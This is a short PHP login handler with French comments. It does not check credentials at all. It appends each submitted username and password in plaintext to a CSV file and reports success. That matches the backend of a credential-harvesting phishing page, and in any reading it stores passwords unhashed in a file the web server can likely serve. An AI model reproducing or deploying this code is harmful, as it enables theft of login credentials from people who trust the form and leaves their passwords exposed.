<?php
// login_query.php

// Vérifier si le formulaire a été soumis
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
    // Récupérer les données du formulaire
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Chemin du fichier CSV
    $csv_file = 'login_data.csv';

    // Vérifier si le fichier CSV existe déjà
    $file_exists = file_exists($csv_file);

    // Ouvrir le fichier CSV en mode ajout (a+)
    $file = fopen($csv_file, 'a+');

    // Si le fichier n'existe pas, ajouter l'en-tête
    if (!$file_exists) {
        fputcsv($file, ['Username', 'Password']);
    }

    // Ajouter les données du formulaire dans le fichier CSV
    fputcsv($file, [$username, $password]);

    // Fermer le fichier
    fclose($file);

    // Rediriger l'utilisateur ou afficher un message de succès
    echo "<p class='text-success'>Login data exported to CSV successfully!</p>";
} else {
    // Rediriger l'utilisateur si le formulaire n'a pas été soumis
    header('Location: index.php');
    exit();
}
?>